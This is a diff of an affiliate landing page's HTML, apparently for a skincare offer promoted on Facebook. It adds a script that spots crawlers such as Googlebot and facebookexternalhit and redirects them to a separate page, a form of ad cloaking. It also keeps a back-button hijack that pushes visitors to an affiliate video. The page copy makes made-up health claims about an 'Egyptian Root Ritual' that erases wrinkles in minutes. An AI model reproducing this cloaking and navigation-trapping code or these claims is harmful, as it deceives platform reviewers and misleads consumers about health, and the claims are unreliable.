@@ -132,26 +132,37 @@ src="https://www.facebook.com/tr?id=520342917221612&ev=PageView&noscript=1"
             }
         }
     </style>
-            <!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1130855064735398');
-fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1130855064735398&ev=PageView&noscript=1"/>
-</noscript>
-<!-- End Meta Pixel Code -->
-	    <!DOCTYPE html>
+	
 <html>
 <head>
+<script>
+    // Lista de User-Agents de alguns bots conhecidos
+    const bots = [
+        "Googlebot",  // Google
+        "Bingbot",    // Bing
+        "Slurp",      // Yahoo
+        "facebookexternalhit", // Facebook
+        "Twitterbot", // Twitter
+        "Pinterest",  // Pinterest
+        "YandexBot"   // Yandex
+    ];
+
+    // Função para detectar se o visitante é um bot
+    function isBot() {
+        const userAgent = navigator.userAgent;
+        return bots.some(bot => userAgent.includes(bot));
+    }
+
+    // Redireciona conforme a detecção
+    window.onload = function() {
+        if (isBot()) {
+            // Redireciona para a página VSL (página para bots)
+            window.location.href = 'https://habitsforabalancedlife.life/vshsl12312';
+        }
+        // Se não for um bot, não faz nada e permanece na página atual
+    };
+</script>
+	
 <script type="text/javascript">
 var newUrl = location.pathname + location.search;
 
@@ -162,7 +173,7 @@ window.addEventListener("popstate", function() {
 if(location.hash === "#!/backbutton") {
 history.replaceState(null, document.title, newUrl);
 setTimeout(function(){
-location.replace("https://theneotonics.com/video.php?aff_id=170827&subid=backredirect");
+location.replace("https://theneotonics.com/video.php?aff_id=170827&subid=backredirect&fb=1");
 },0);
 }
 }, false);
@@ -174,9 +185,9 @@ location.replace("https://theneotonics.com/video.php?aff_id=170827&subid=backred
         <div class="headline">99.8% of women don't know this</div>
         <div class="subheadline">Discover the "Egyptian Root Ritual" Secret That Demolishes Wrinkles <u>in Minutes</u></div>
         <div class="image-container">
-            <a href="https://theneotonics.com/video.php?aff_id=170827"><img src="images/play.avif" alt="Amazing Skin Secret"></a>
+            <a href="https://theneotonics.com/video.php?aff_id=170827&fb=1"><img src="images/play.avif" alt="Amazing Skin Secret"></a>
         </div>
-        <a href="https://theneotonics.com/video.php?aff_id=170827" class="cta-button">Discover the "Egyptian Root Ritual" take 20 years off ones age</a>
+        <a href="https://theneotonics.com/video.php?aff_id=170827&fb=1" class="cta-button">Discover the "Egyptian Root Ritual" take 20 years off ones age</a>
         <div class="main-text">
             Scientists recently discovered a strange "Egyptian Root Ritual" that is 10 times more potent than retinol.<br><br>
             Rub it in your face daily for 2 minutes to overthrow black spots, wrinkles and other skin problems that come with age.
@@ -219,10 +230,10 @@ location.replace("https://theneotonics.com/video.php?aff_id=170827&subid=backred
 </script>
 
 </body>
-        <a href="https://theneotonics.com/video.php?aff_id=170827" class="cta-button">Watch Now</a>
+        <a href="https://theneotonics.com/video.php?aff_id=170827&fb=1" class="cta-button">Watch Now</a>
     </div>
     <div class="footer">
-        <p><a href="https://theneotonics.com/video.php?aff_id=170827" style="color: #fff; text-decoration: none;">Privacy Policy | Earnings | Contact</a></p>
+        <p><a href="https://theneotonics.com/video.php?aff_id=170827&fb=1" style="color: #fff; text-decoration: none;">Privacy Policy | Earnings | Contact</a></p>
         <p>Copyright 2024.</p>
         <p>All rights reserved</p>
         <p>This site is not affiliated with Facebook, Inc. or Facebook.com, and is not sponsored or endorsed by Facebook</p>
